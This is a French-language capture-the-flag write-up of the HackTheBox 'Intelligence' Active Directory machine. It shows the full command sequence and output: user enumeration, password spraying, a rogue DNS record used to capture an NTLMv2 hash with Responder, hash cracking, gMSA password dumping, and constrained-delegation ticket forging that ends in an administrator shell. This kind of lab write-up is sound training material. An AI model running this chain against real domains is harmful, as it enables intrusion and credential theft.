\chapter{intelligence}
\begin{itemize}
    \item {\bf technics}: Active Directory, abuse ACL, ReadGMSAPassword,
        constraint delegation, silver ticket, password spray, idor, kerberos
    \item {\bf Components}: 
    \item {\bf tools}: dnstool.py
\end{itemize}


\section{nmap}
\begin{verbatim}
$ nmapz 10.10.10.248
ports found: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49705,49714
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-27 04:38 CET
NSOCK ERROR [103.3360s] mksock_bind_addr(): Bind to 0.0.0.0:631 failed (IOD #100): Address already in use (98)
Nmap scan report for 10.10.10.248
Host is up (0.082s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-27 10:38:17Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-01-27T10:39:47+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2023-01-27T10:39:48+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2023-01-27T10:39:47+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-01-27T10:39:48+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2023-01-27T10:39:07
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

\end{verbatim}

\section{smb}
\begin{verbatim}
$ enum4linux-ng -A 10.10.10.248 | tee evidence/e4l.out
\end{verbatim}

pas de share / user pour le moement.


\section{http}

\begin{verbatim}
$ curl -I intelligence.htb
HTTP/1.1 200 OK
Content-Length: 7432
Content-Type: text/html
Last-Modified: Thu, 01 Apr 2021 19:00:00 GMT
Accept-Ranges: bytes
ETag: "0b8f6362927d71:0"
Server: Microsoft-IIS/10.0
Date: Fri, 27 Jan 2023 10:48:02 GMT

\end{verbatim}

\begin{verbatim}
$ whatweb intelligence.htb | tr ',' '\n'
http://intelligence.htb [200 OK] Bootstrap
 Country[RESERVED][ZZ]
 Email[contact@intelligence.htb]
 HTML5
 HTTPServer[Microsoft-IIS/10.0]
 IP[10.10.10.248]
 JQuery
 Microsoft-IIS[10.0]
 Script
 Title[Intelligence]

\end{verbatim}

pas de vhost visiblement
pas trop de contenu 

\begin{verbatim}
$ exiftool evidence/2020-01-01-upload.pdf
ExifTool Version Number         : 12.50
File Name                       : 2020-01-01-upload.pdf
Directory                       : evidence
File Size                       : 27 kB
File Modification Date/Time     : 2023:01:27 04:57:06+01:00
File Access Date/Time           : 2023:01:27 04:57:06+01:00
File Inode Change Date/Time     : 2023:01:27 04:57:22+01:00
File Permissions                : -rw-r-----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee

$ exiftool evidence/2020-12-15-upload.pdf
ExifTool Version Number         : 12.50
File Name                       : 2020-12-15-upload.pdf
Directory                       : evidence
File Size                       : 27 kB
File Modification Date/Time     : 2023:01:27 04:57:26+01:00
File Access Date/Time           : 2023:01:27 04:57:26+01:00
File Inode Change Date/Time     : 2023:01:27 04:57:29+01:00
File Permissions                : -rw-r-----
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams

\end{verbatim}

\begin{verbatim}
$ kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 01/27/23 - Ronnie Flathers @ropnop

2023/01/27 05:02:09 >  Using KDC(s):
2023/01/27 05:02:09 >   dc.intelligence.htb:88

2023/01/27 05:02:09 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2023/01/27 05:02:09 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2023/01/27 05:02:09 >  Done! Tested 2 usernames (2 valid) in 0.105 seconds

$ cme smb -u users.txt -p users.txt --continue-on-success 10.10.10.248
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:Jose.Williams STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:William.Lee STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:Jose.Williams STATUS_LOGON_FAILURE
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:William.Lee STATUS_LOGON_FAILURE



$ GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/Jose.Williams
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for Jose.Williams
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set

$ GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/William.Lee
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for William.Lee
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set

\end{verbatim}

\begin{verbatim}
$ cme smb -u users.txt -p utils/wordlists/passwords/rockyou.txt --continue-on-success 10.10.10.248

\end{verbatim}


existe-'il d'autres docs ?

\begin{verbatim}
 cat test.sh 
startdate=20200101
enddate=20201231
d=
n=0
until [ "$d" = "$enddate" ]
do  
    ((n++))
    d=$(date -d "$startdate + $n days" +%Y%m%d)
    status=$(curl -Is http://intelligence.htb/documents/$(date -d "$d" +%Y-%m-%d)-upload.pdf | head -n 1 | cut -d' ' -f 2)
    if [[ $status -eq '200' ]]; then
        echo "$(date -d "$d" +%Y-%m-%d)-upload.pdf: $status"
        curl -Os http://intelligence.htb/documents/$(date -d "$d" +%Y-%m-%d)-upload.pdf
        exiftool $(date -d "$d" +%Y-%m-%d)-upload.pdf |grep Creator | cut -d':' -f2 >>users2.txt
        rm $(date -d "$d" +%Y-%m-%d)-upload.pdf 
    fi


done

$ cat users2.txt | sort |uniq > users3.txt

$ kerbrute userenum --dc dc.intelligence.htb -d intelligence.htb users3.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 01/27/23 - Ronnie Flathers @ropnop

2023/01/27 05:44:01 >  Using KDC(s):
2023/01/27 05:44:01 >  	dc.intelligence.htb:88

2023/01/27 05:44:01 >  [+] VALID USERNAME:	 David.Wilson@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Darryl.Harris@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Ian.Duncan@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 David.Reed@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Anita.Roberts@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Brian.Morris@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Danny.Matthews@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Brian.Baker@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Daniel.Shelton@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 David.Mcbride@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Jason.Wright@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Jessica.Moody@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Jennifer.Thomas@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Jason.Patterson@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Nicole.Brock@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 John.Coleman@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Jose.Williams@intelligence.htb
2023/01/27 05:44:01 >  [+] VALID USERNAME:	 Kelly.Long@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Richard.Williams@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Kaitlyn.Zimmerman@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Tiffany.Molina@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Scott.Scott@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Samuel.Richardson@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Teresa.Williamson@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Stephanie.Young@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Travis.Evans@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Thomas.Valenzuela@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Thomas.Hall@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 William.Lee@intelligence.htb
2023/01/27 05:44:02 >  [+] VALID USERNAME:	 Veronica.Patel@intelligence.ht

$ cme smb -u users3.txt -p users3.txt --continue-on-success 10.10.10.24
rien 
\end{verbatim}

on va devoir lire les pdf

\begin{verbatim}
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.


New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.

\end{verbatim}

\begin{verbatim}
$ cme smb -u users3.txt -p NewIntelligenceCorpUser9876 --continue-on-success 10.10.10.248
...SNIP...
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
...SNIP...

\end{verbatim}

pas encore de winrm
\begin{verbatim}
 evil-winrm -i 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
fatal: detected dubious ownership in repository at '/usr/share/evil-winrm'
To add an exception for this directory, call:

        git config --global --add safe.directory /usr/share/evil-winrm

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
\end{verbatim}


\section{smb}
back

\begin{verbatim}
$ cme smb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares 10.10.10.248
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.10.10.248    445    DC               [+] Enumerated shares
SMB         10.10.10.248    445    DC               Share           Permissions     Remark
SMB         10.10.10.248    445    DC               -----           -----------     ------
SMB         10.10.10.248    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.248    445    DC               C$                              Default share
SMB         10.10.10.248    445    DC               IPC$            READ            Remote IPC
SMB         10.10.10.248    445    DC               IT              READ
SMB         10.10.10.248    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.10.248    445    DC               SYSVOL          READ            Logon server share
SMB         10.10.10.248    445    DC               Users           READ

$ cme smb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -M spider_plus --share IT 10.10.10.248

$ cat IT.json |grep  '": {'
\end{verbatim}


\begin{verbatim}
$ smbclient -U Tiffany.Molina //10.10.10.248/IT NewIntelligenceCorpUser9876 -c 'get downdetector.ps1 downdetector.ps1'
Can't load /etc/samba/smb.conf - run testparm to debug it
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

$ cat downdetector.ps1
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
\end{verbatim}

Ted.Graves n'était pas connu

visiblement ce monsieur se connect avec son password a tout ce qui commence par
web dans la zone DNS.

A-t'on le role DNSAdmin ou peut on utiliser
\href{https://github.com/dirkjanm/krbrelayx}{dnstool}

d'abord config responder


\begin{verbatim}
 grep HTTP /usr/share/responder/Responder.conf
HTTP = On
HTTPS = On
[HTTP Server]
; HTML answer to inject in HTTP responses (before </body> tag).
[HTTPS Server]

\end{verbatim}

dnstool ne passe pas \verb+ValueError: unsupported hash type MD4+

par contre on peut le forcer avec 
\begin{verbatim}
$ python3 /usr/share/krbrelayx/dnstool.py \
    -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 \
    -a add -r web-jubeaz  -d 10.10.16.4 -t A \
    10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

\end{verbatim}

\begin{verbatim}
$ sudo responder -I tun0 --lm
...SNIP...
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:122d0c77cacc61c1:E77643CC092A60377CEBDB199CD276A8:01010000000000009ED9E6A6E732D90178D74AA34EB99B740000000002000800540054005700450001001E00570049004E002D00410037005000320047004100340047005A004D0032000400140054005400570045002E004C004F00430041004C0003003400570049004E002D00410037005000320047004100340047005A004D0032002E0054005400570045002E004C004F00430041004C000500140054005400570045002E004C004F00430041004C0008003000300000000000000000000000002000005834B7499CB9B7A257B4B4C9757F51FA1306C05E6C863577DFBB33A9C89BC9BA0A001000000000000000000000000000000000000900400048005400540050002F007700650062002D006A0075006200650061007A002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
\end{verbatim}

\begin{verbatim}
$ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt ./ted.graves.hash
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
\end{verbatim}


\begin{verbatim}
$ evil-winrm -i 10.10.10.248/intelligence.htb -u Ted.Graves -p Mr.Teddy
fatal: detected dubious ownership in repository at '/usr/share/evil-winrm'
To add an exception for this directory, call:

        git config --global --add safe.directory /usr/share/evil-winrm

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMHTTPTransportError happened, message is Unable to parse authorization header. Headers: {"Content-Type"=>"text/html", "Server"=>"Microsoft-IIS/10.0", "Date"=>"Sat, 28 Jan 2023 07:15:09 GMT", "Content-Length"=>"1245"}
Body: <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
\end{verbatim}

\begin{verbatim}
$ cme smb 10.10.10.248 -u Ted.Graves -p 'Mr.Teddy' -M spider_plus
[-] Failed loading module at /usr/lib/python3.10/site-packages/cme/modules/masky.py: No module named 'masky'
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy
SPIDER_P... 10.10.10.248    445    DC               [*] Started spidering plus with option:
SPIDER_P... 10.10.10.248    445    DC               [*]        DIR: ['print$']
SPIDER_P... 10.10.10.248    445    DC               [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.10.10.248    445    DC               [*]       SIZE: 51200
SPIDER_P... 10.10.10.248    445    DC               [*]     OUTPUT: /tmp/cme_spider_plus
\end{verbatim}

rien  de plus

on va regarder ce que dit l'AD avec bloodhound

\begin{verbatim}
$ bloodhound-python -ns 10.10.10.248 -d intelligence.htb -u Ted.Graves -p Mr.Teddy -c all
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The resolution lifetime expired after 3.203 seconds: Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.; Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.
INFO: Done in 00M 09S
\end{verbatim}

d'après ce que l'on peut voir 
\begin{itemize}
    \item \verb+Ted.Graves+ est membre de \verb+ITSUPPORT+
    \item \verb+ITSUPPORT+ a le droit \verb+ReadGMSPassword+ sur \verb+SVC_INT+
\end{itemize}

sur le tab Node Info on a notament \verb+Allow to Delegate WWW/dc.intelligence.htb+


\begin{verbatim}
$ gmsadumper -u Ted.Graves -p Mr.Teddy -l 10.10.10.248 -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::4eded24079fe2667c67f2b43fd6cb57b
svc_int$:aes256-cts-hmac-sha1-96:3f07249f66a3678529bc87b0d6bce206d86ef0e5ed00f488d66751810c722817
svc_int$:aes128-cts-hmac-sha1-96:b8173f21d39ccd3e047ea12c2f791ab4
\end{verbatim}

avec le hash on va pouvoir forger un silver ticket 

\begin{verbatim}
$ getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb \
    -hashes :4eded24079fe2667c67f2b43fd6cb57b -impersonate administrator \
    intelligence.htb/svc_int
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
\end{verbatim}

il va falloir synchroniser la date avec le serveur

\begin{verbatim}
$ sudo timedatectl status
               Local time: Sat 2023-01-28 01:43:25 CET
           Universal time: Sat 2023-01-28 00:43:25 UTC
                 RTC time: Sat 2023-01-28 00:43:25
                Time zone: Europe/Paris (CET, +0100)
System clock synchronized: yes
              NTP service: active
          RTC in local TZ: no
\end{verbatim}

\begin{verbatim}
$ sudo timedatectl set-ntp false
$ ## edit /etc/systemd/timesyncd.conf to point
$ cat /etc/systemd/timesyncd.conf |grep '^NTP'
NTP=dc.intelligence.htb
# $ sudo timedatectl set-ntp true
\end{verbatim}

ne marche pas

\begin{verbatim}
$ sudo timedatectl set-ntp false
$ ldapsearch -LLL -x -H ldap://10.10.10.248 -b '' -s base '(objectclass=*)' |grep currentTime
currentTime: 20230128092311.0Z

$ sudo timedatectl set-time '2023-01-28 10:31:31'
\end{verbatim}


\begin{verbatim}
$ getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :4eded24079fe2667c67f2b43fd6cb57b -impersonate administrator intelligence.htb/svc_int
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
$ export KRB5CCNAME=administrator.ccache
$ wmiexec.py -k -no-pass administrator@dc.intelligence.htb
$ wmiexec.py -k -no-pass administrator@dc.intelligence.htb
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami /All

USER INFORMATION
----------------

User Name                  SID
========================== =============================================
intelligence\administrator S-1-5-21-4210132550-3389855604-3437519686-500
\end{verbatim}




